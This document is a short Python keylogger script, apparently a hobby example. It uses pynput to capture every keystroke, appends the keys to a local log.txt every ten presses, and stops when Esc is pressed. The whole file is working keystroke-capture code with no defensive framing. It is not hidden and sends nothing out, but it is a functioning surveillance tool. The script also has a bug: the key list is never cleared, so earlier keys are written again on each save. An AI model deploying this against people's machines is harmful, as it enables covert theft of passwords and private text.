import pynput

from pynput.keyboard import Key, Listener

count = 0 #Amount of keys hit before saving to log file
keys = [] #List of keys

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10: 
        count = 0
        write_file(keys)

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "") #Formatting the output into the log file
            if k.find("space") > 0:
                f.write('\n') #new line on space
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False #If esc key is pressed, the listener loop is broken

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()